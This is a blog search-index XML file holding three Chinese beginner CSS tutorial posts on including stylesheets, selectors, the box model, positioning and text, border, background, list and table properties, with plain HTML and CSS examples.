<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSS基础学习1.0</title>
    <url>/2018/02/25/CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A01-0/</url>
    <content><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="CSS的引入方式-4种"><a href="#CSS的引入方式-4种" class="headerlink" title="CSS的引入方式(4种)"></a>CSS的引入方式(4种)</h2><h3 id="1-内联样式-行内样式"><a href="#1-内联样式-行内样式" class="headerlink" title="1.内联样式(行内样式)"></a>1.内联样式(行内样式)</h3><ul>
<li><p>内联样式是所有样式中最直接的一种，他直接对HTML标签使用style属性。</p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标签&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p style&#x3D;&quot;color:#FF0000; font-size:20px; text-decoration:underline;&quot;&gt;正文内容1&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p style&#x3D;&quot;color:#000000; font-style:italic;&quot;&gt;正文内容2&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p style&#x3D;&quot;color:#FF00FF; font-size:25px; font-weight:bold;&quot;&gt;正文内容3&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-内部样式-内嵌样式"><a href="#2-内部样式-内嵌样式" class="headerlink" title="2.内部样式(内嵌样式)"></a>2.内部样式(内嵌样式)</h3></li>
<li><p>内部样式是将CSS写在<head>与</head>之间，并且用<style>和</style>标记进行声明。</p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标签&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">p&#123;</span><br><span class="line">	color:#FF00FF;</span><br><span class="line">	text-decoration:underline;</span><br><span class="line">	font-weight:bold;</span><br><span class="line">	font-size:25px;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;紫色，粗体，下划线，25px&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;紫色，粗体，下划线，25px&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;紫色，粗体，下划线，25px&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="3-引入外部样式文件"><a href="#3-引入外部样式文件" class="headerlink" title="3.引入外部样式文件"></a>3.引入外部样式文件</h3></li>
<li><p>此种方式使用频率最高，也是最常使用的方式，让结构与表现分离。</p>
</li>
<li><p>语法：<code>&lt;link type=&quot;text/css&quot; rel=&quot;style&quot; href=&quot;外部样式文件&quot;&gt;</code></p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标签&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link herf&#x3D;&quot;1.css&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSS标题1&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;p&gt;紫色，粗体，下划线，25px&lt;&#x2F;p&gt;</span><br><span class="line">&lt;h2&gt;CSS标题2&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;p&gt;紫色，粗体，下划线，25px&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>1.css</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h2&#123;</span><br><span class="line">	color:#0000FF;</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">	color:#FF00FF;</span><br><span class="line">	text-decoration:underline;</span><br><span class="line">	font-weight:bold;</span><br><span class="line">	font-size:20px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-导入外部样式文件"><a href="#4-导入外部样式文件" class="headerlink" title="4.导入外部样式文件"></a>4.导入外部样式文件</h3><ul>
<li><p>这种导入方式和<code>&lt;link&gt;</code>方式功能类似，就是语法不同，在<code>&lt;style&gt;</code>和<code>&lt;/style&gt;</code>之间使用。</p>
</li>
<li><p>语法：@import”样式文件”或@import url(“样式文件”)</p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标签&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">@import url(1.css);</span><br><span class="line">--&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSS标题1&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;p&gt;紫色，粗体，下划线，25px&lt;&#x2F;p&gt;</span><br><span class="line">&lt;h2&gt;CSS标题2&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;p&gt;紫色，粗体，下划线，25px&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="各种方式的优先级"><a href="#各种方式的优先级" class="headerlink" title="各种方式的优先级"></a>各种方式的优先级</h3></li>
<li><p>优先级顺序：内联&gt;内部&gt;import&gt;link</p>
</li>
</ul>
<h2 id="CSS常用选择器"><a href="#CSS常用选择器" class="headerlink" title="CSS常用选择器"></a>CSS常用选择器</h2><h3 id="标记选择器-元素选择器"><a href="#标记选择器-元素选择器" class="headerlink" title="标记选择器(元素选择器)"></a>标记选择器(元素选择器)</h3><ul>
<li><p>E{…}/<em>E代表有效的HTML元素</em>/</p>
</li>
<li><p>示例效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  p&#123;color:red; font-size:18px&#125;</span><br><span class="line">  div&#123;background-color:gray; font-size:25px&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;p&gt;正文内容1&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p&gt;正文内容2&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;div&gt;正文内容3&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h3></li>
<li><p>[E].classValue{…}</p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .one&#123;color:red; &#125;</span><br><span class="line">  .three&#123;font-size:20px;&#125;</span><br><span class="line">  div.two&#123;background-color:gray; font-size:25px;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;p class&#x3D;&quot;one&quot;&gt;正文内容1&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p class&#x3D;&quot;one three&quot;&gt;正文内容2&lt;&#x2F;p&gt; #可以同时使用两种class</span><br><span class="line">  &lt;div class&#x3D;&quot;one&quot;&gt;正文内容3&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;two&quot;&gt;正文内容4&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="ID选择器"><a href="#ID选择器" class="headerlink" title="ID选择器"></a>ID选择器</h3></li>
<li><p>[E]#idValue{…}</p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">  #one&#123;color:red; &#125;</span><br><span class="line">  div#two&#123;background-color:gray; font-size:25px;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;p id&#x3D;&quot;one&quot;&gt;正文内容1&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p id&#x3D;&quot;two&quot;&gt;正文内容2&lt;&#x2F;p&gt; </span><br><span class="line">  &lt;div id&#x3D;&quot;one&quot;&gt;正文内容3&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;two&quot;&gt;正文内容4&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="选择器组合"><a href="#选择器组合" class="headerlink" title="选择器组合"></a>选择器组合</h3></li>
<li><p>selector1，selector2，selector3{…}</p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">  h1,h2,h3,h4,h5,p&#123;color:red; &#125;</span><br><span class="line">  h2.two, .one, #aaa&#123;background-color:gray; font-size:25px;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1 class&#x3D;&quot;one&quot;&gt;正文内容1&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p class&#x3D;&quot;two&quot;&gt;正文内容2&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;h2 id&#x3D;&quot;aaa&quot;&gt;正文内容3&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;h5 class&#x3D;&quot;one&quot;&gt;正文内容4&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="选择器嵌套"><a href="#选择器嵌套" class="headerlink" title="选择器嵌套"></a>选择器嵌套</h3></li>
<li><p>selector1 selector2{…}</p>
</li>
<li><p>示例效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">  p d&#123;background-color:gray; font-size:25px;&#125;</span><br><span class="line">  --&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;p&gt;嵌套&lt;b&gt;使用&lt;b&gt;css&lt;&#x2F;b&gt;&lt;&#x2F;b&gt;标记的方法&lt;&#x2F;p&gt;</span><br><span class="line">  嵌套&lt;b&gt;之&lt;&#x2F;b&gt;外</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS基础学习3.0</title>
    <url>/2018/03/07/CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A03-0/</url>
    <content><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><blockquote>
<p>我们可以把页面中的元素都可以看做一个盒子，占据着一定的页面空间，这些占据的空间往往比单纯的内容要大，换句话说，我们可以调整盒子的边框和距离的参数来调节盒子的位置。</p>
</blockquote>
<p><img src="/uploads/2.png" alt="图片"></p>
<blockquote>
<p>一个盒子的宽度（或高度）是由content+padding+border+margin，并且对于任何一个盒子，都可以分别设定4条边各自的border、padding、margin。因此我们可以利用好盒子的这些属性，就能很好的实现各种各样的排班效果。</p>
</blockquote>
<h3 id="border"><a href="#border" class="headerlink" title="border"></a>border</h3><blockquote>
<p>border的属性主要有3个，分别为color、width、style，通常在设置border时常常将三个属性进行很好的配合，才能达到良好的效果。</p>
</blockquote>
<ul>
<li>代码示例<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">border-width:6px;</span><br><span class="line">border-color:#000000;</span><br><span class="line">margin:20px; padding:5px;</span><br><span class="line">background-color:#FFFFCC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div style&#x3D;&quot;border-style: dashed;&quot;&gt;no1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div style&#x3D;&quot;border-style: dotted;&quot;&gt;no2&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div style&#x3D;&quot;border-style: double;&quot;&gt;no3&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div style&#x3D;&quot;border-style: solid;&quot;&gt;no4&lt;&#x2F;div&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="padding"><a href="#padding" class="headerlink" title="padding"></a>padding</h3></li>
</ul>
<blockquote>
<p>padding用于控制content和border之间的距离</p>
</blockquote>
<p><img src="/uploads/3.png" alt="图片"></p>
<ul>
<li>代码示例<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.outside&#123;</span><br><span class="line">	padding:10px 30px 50px 100px; &#x2F;*同时设置，顺时针，上右下左*&#x2F;</span><br><span class="line">	border:1px solid #000000;&#x2F;*外边框*&#x2F;</span><br><span class="line">	background-color:#fffcd3;&#x2F;*外背景*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">.inside&#123;</span><br><span class="line">	background-color:#66b2ff;&#x2F;*内背景*&#x2F;</span><br><span class="line">	border:1px solid #005dbc;&#x2F;*内边框*&#x2F;</span><br><span class="line">	width:100%;line-height:40px;</span><br><span class="line">	text-align:center;</span><br><span class="line">	font-family:Arial;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;outside&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;inside&quot;&gt;padding&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<h3 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h3></li>
</ul>
<blockquote>
<p>margin指的是元素与元素之间的距离</p>
</blockquote>
<p><img src="/uploads/4.png" alt="图片"></p>
<ul>
<li><p>代码示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">span&#123;</span><br><span class="line">	background-color:#a2d2ff;</span><br><span class="line">	text-align:center;</span><br><span class="line">	font-family:Arial,Helvetica,sans-serif;</span><br><span class="line">	font-size:12px;</span><br><span class="line">	padding:10px;</span><br><span class="line">&#125;</span><br><span class="line">span.left&#123;</span><br><span class="line">	margin-right:30px;</span><br><span class="line">	background-color:#a9d6ff;</span><br><span class="line">&#125;</span><br><span class="line">span.right&#123;</span><br><span class="line">	margin-left:40px;</span><br><span class="line">	background-color:#eeb0b0;</span><br><span class="line">&#125;</span><br><span class="line">div&#123;</span><br><span class="line">	background-color:#a2d2ff;</span><br><span class="line">	text-align:center;</span><br><span class="line">	font-family:Arial,Helvetica,sans-serif;</span><br><span class="line">	font-size:12px;</span><br><span class="line">	padding:10px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;span class&#x3D;&quot;left&quot;&gt;行内元素1&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;right&quot;&gt;行内元素2&lt;&#x2F;span&gt; &#x2F;*行级元素距离30+40&#x3D;70px*&#x2F;</span><br><span class="line">&lt;div style&#x3D;&quot;margin-bottom: 50px；&quot;&gt;块元素1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div style&#x3D;&quot;margin-top: 30px；&quot;&gt;块元素2&lt;&#x2F;div&gt; &#x2F;*块级元素距离是两者之种较大者，50px*&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>margin除了设置正数以外，也可以设置为负数，当设置为负数时，会使得块向反方向移动，甚至覆盖在另外的块上。</p>
</li>
<li><p>当块之间是父子关系，通过设置子块的margin为负数，可以使得子块从父块中”分离”出来</p>
</li>
</ul>
<h2 id="元素定位"><a href="#元素定位" class="headerlink" title="元素定位"></a>元素定位</h2><h3 id="float"><a href="#float" class="headerlink" title="float"></a>float</h3><blockquote>
<p>1.网页中各种元素都必须有自己的位置，从而搭建出整个页面的结构。在这里我们介绍使用CSS的float、position和z-index属性来进行块元素的定位。<br>2.float定位是CSS排版中重要的手段。属性float的值很简单，可以设置为left、right或者默认值none，当设置了元素向左或向右浮动时，元素会向其父元素的左侧或右侧靠近</p>
</blockquote>
<ul>
<li>代码示例<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">	margin:15px;</span><br><span class="line">	font-family:Arial;</span><br><span class="line">	font-size:12px;</span><br><span class="line">&#125;</span><br><span class="line">.father&#123;</span><br><span class="line">	background-color:#fffea6;</span><br><span class="line">	border:1px solid #111111;</span><br><span class="line">	padding:25px;</span><br><span class="line">&#125;</span><br><span class="line">.son1&#123;</span><br><span class="line">	padding:10px;</span><br><span class="line">	margin:5px;</span><br><span class="line">	background-color:#70baff;</span><br><span class="line">	border:1px dashed #111111;</span><br><span class="line">	float:left;  &#x2F;*与不加float的对比一下看看有何不同*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">.son2&#123;</span><br><span class="line">	padding:5px;</span><br><span class="line">	margin:0px;</span><br><span class="line">	background-color:#ffd270;</span><br><span class="line">	border:1px dashed #111111;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;father&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;son1&quot;&gt;float1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;son2&quot;&gt;float2&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1.当son1设置了float之后，son1的宽度仅仅是它的内容本身加上自己的padding，对于父容器而言它已经不属于父块了，所以在其下面的son2会上来，它内部的内容围绕在son1周围，并且保持着son1所设置的margin距离。</p>
</blockquote>
</li>
</ul>
<p>2.倘若将子块son1与子块son2都向左浮，并且给son2添加内容变会发现子块son2不再环绕son1。</p>
<blockquote>
<p>当设置了float时，经常会遇见重叠的现象，导致压在底层的不能显示出来，那么在CSS中可以通过设置块元素的clear属性来清理对float的影响，主要可以设置一下三个值，left、right、both。</p>
</blockquote>
<h3 id="position"><a href="#position" class="headerlink" title="position"></a>position</h3><blockquote>
<p>position定位与float一样，也是CSS排版中非常重要的概念。position从字面意思上看就是制定块的位置。即块相对于其父块的位置和相对他自身应该在的位置。</p>
</blockquote>
<ul>
<li>代码示例<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#block&#123;</span><br><span class="line">	background-color: #fff0ac;</span><br><span class="line">	border:1px dashed #000000;</span><br><span class="line">	padding:10px;</span><br><span class="line">	position:absolute; &#x2F;* absolute绝对定位*&#x2F;</span><br><span class="line">	left:20px; &#x2F;*块的左边框离页面左边界20px *&#x2F;</span><br><span class="line">	top:40px; &#x2F;* 块的上边框离页面上边界40px*&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1.当将子块的position设置为absolute时，子块已经不再属于父块，其左边框设置的距离是相对页面body的距离，而不是父块的距离。</p>
</blockquote>
</li>
</ul>
<p>2.当将块的position参数设置为relative时，与将其设置为absolute时完全不同，这时子块是相对于自身在父块的原先位置来进行定位的。<br>3.将子块position属性设置为relative时，子块仍然属于其父块，只是相对于自己在父块中的原先位置有了移动改变。</p>
<h3 id="z-index"><a href="#z-index" class="headerlink" title="z-index"></a>z-index</h3><blockquote>
<p>z-index属性用于调整定位时重叠块的上下位置，当块设置了position属性时，该值便可设置各块之间的重叠高低关系，默认值为0.</p>
</blockquote>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS基础学习2.0</title>
    <url>/2018/02/26/CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A02-0/</url>
    <content><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="CSS字体和文本相关属性"><a href="#CSS字体和文本相关属性" class="headerlink" title="CSS字体和文本相关属性"></a>CSS字体和文本相关属性</h2><h3 id="CSS字体属性"><a href="#CSS字体属性" class="headerlink" title="CSS字体属性"></a>CSS字体属性</h3><blockquote>
<p>font-family:规定文本的字体系列。如”serif”、”sans-serif”等<br>font-size:规定文本的字体尺寸。<br>font-style:规定文本的字体样式。主要有noraml、italic、oblique<br>font-weight:规定字体的粗细。主要有normal、bold、自定义粗细</p>
</blockquote>
<ul>
<li>代码示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">p.arc&#123;</span><br><span class="line">	font-size:20px;</span><br><span class="line">	font-family:楷体_GB2312;</span><br><span class="line">	font-style:normal;</span><br><span class="line">	font-weight:bold;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
<h3 id="CSS文本属性"><a href="#CSS文本属性" class="headerlink" title="CSS文本属性"></a>CSS文本属性</h3></li>
</ul>
<blockquote>
<p>color:文本颜色<br>letter-spacing：字体间距<br>line-height：文本行高<br>text-align：文本的对齐方式，主要有left、right、center<br>text-decoration：文本的装饰效果，主要有overline、underline、linethrough<br>text-indent：文本块首行缩进<br>text-transform：文本的大小写，主要有uppercase、lowercase、capitalize<br>word-spacing：单词间距</p>
</blockquote>
<ul>
<li>代码示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">p.one&#123;color:red; text-decoration:underline; text-align:center&#125;</span><br><span class="line">p.two&#123;text-decoration:overline; text-indent:20px; line-height:50px&#125;</span><br><span class="line">p.three&#123;text-decoration:line-through; text-transform:uppercase&#125;</span><br><span class="line">p.four&#123;word-spacing:20px; letter-spacing:5px&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
<h2 id="CSS边框和相关背景属性"><a href="#CSS边框和相关背景属性" class="headerlink" title="CSS边框和相关背景属性"></a>CSS边框和相关背景属性</h2></li>
</ul>
<h3 id="边框属性"><a href="#边框属性" class="headerlink" title="边框属性"></a>边框属性</h3><blockquote>
<p>border:声明中设置所有边框属性<br>border-width：四条边框的宽度<br>border-style：四条边框样式，主要有dotted、solid、double、dashed<br>border-color：四条边框颜色<br>border-left：声明左边框属性，同时还有border-right、border-top、border-bottom<br>border-left-color：左边框颜色<br>border-left-style：左边框样式<br>border-left-width：左边框宽度</p>
</blockquote>
<ul>
<li>代码示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">img.test1&#123;</span><br><span class="line">	border-left-style:dotted;</span><br><span class="line">	border-top-color:#FF9900;</span><br><span class="line">	border-bottom-width:5px;</span><br><span class="line">	border-right-color:#FF9900;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">img.test2&#123;</span><br><span class="line">	border:5px double #FF00FF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="背景相关属性"><a href="#背景相关属性" class="headerlink" title="背景相关属性"></a>背景相关属性</h3></li>
</ul>
<blockquote>
<p>background:声明中设置所有的背景属性<br>background-attachment：背景图像是否固定或随着页面的其余部分滚动，主要有fixed和scroll两个值<br>background-color：背景颜色<br>background-image：元素的背景图像。主要有url和none两个属性<br>background-position：背景图像的开始位置。可以指定top left等，也可以指定具体的像素位置<br>background-repeat：是否及如何重复背景图像。主要有repeat、repeat-x、repeat-y、no-repeat</p>
</blockquote>
<ul>
<li>代码示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">	background-image:url(1.jpg);</span><br><span class="line">	background-repeat:no-repeat;</span><br><span class="line">	background-position:200px 25px;</span><br><span class="line">	&#x2F;*background-position:20% 25%;*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">合并写</span><br><span class="line">body&#123;</span><br><span class="line">	background:url(1.jpg) no-repeat 200px 25px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CSS列表和表格相关属性"><a href="#CSS列表和表格相关属性" class="headerlink" title="CSS列表和表格相关属性"></a>CSS列表和表格相关属性</h2></li>
</ul>
<h3 id="列表元素属性"><a href="#列表元素属性" class="headerlink" title="列表元素属性"></a>列表元素属性</h3><blockquote>
<p>list-style：在一个声明中设置所有的列表属性。<br>list-style-image：将图像设置为列表项标记。主要有URL值<br>list-style-position：设置列表项标记的放置位置，主要有outside和inside两个值<br>list-style-type：设置列表项标记的类型。主要有disc、circle、square、decimal等</p>
</blockquote>
<ul>
<li>代码示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul style&#x3D;&quot;list-style-image:url(icon1.jpg)&quot;&gt;</span><br><span class="line">&lt;li&gt;no1&lt;&#x2F;li&gt;</span><br><span class="line">&lt;li&gt;no2&lt;&#x2F;li&gt;</span><br><span class="line">&lt;li&gt;no3&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;ol style&#x3D;&quot;list-style-type: decimal; list-style-position: inside;&quot;&gt;</span><br><span class="line">&lt;li&gt;no1&lt;&#x2F;li&gt;</span><br><span class="line">&lt;li&gt;no2&lt;&#x2F;li&gt;</span><br><span class="line">&lt;li&gt;no3&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ol&gt;</span><br><span class="line">注：list-style-image和list-style-type不能同时使用</span><br></pre></td></tr></table></figure>
<h3 id="表格元素属性"><a href="#表格元素属性" class="headerlink" title="表格元素属性"></a>表格元素属性</h3></li>
</ul>
<blockquote>
<p>border-collapse:设置是否把表格边框合并为单一的边框<br>border-spacing：设置分隔单元格边框的距离<br>caption-side：设置表格标题的位置<br>empty-cells：设置是否显示表格中的空单元格</p>
</blockquote>
<ul>
<li>代码示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#tb&#123;border-collapse:collapse; border-spacing:20px; caption-side:bottom&#125;</span><br><span class="line">&lt;table id&#x3D;&quot;tb&quot;&gt;</span><br><span class="line">&lt;caption&gt;我的表格&lt;&#x2F;caption&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;单元格1&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;单元格2&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;单元格3&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;单元格1&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;单元格2&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;单元格3&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure>
<h3 id="CSS常用伪类别属性"><a href="#CSS常用伪类别属性" class="headerlink" title="CSS常用伪类别属性"></a>CSS常用伪类别属性</h3></li>
</ul>
<blockquote>
<p>a:link:超链接的普通样式<br>a:visited：被点击过的超链接样式<br>a:hover：鼠标指针经过超链接上时的样式<br>a:active：在超链接上单击时，即”当前激活”时超链接的样式</p>
</blockquote>
<ul>
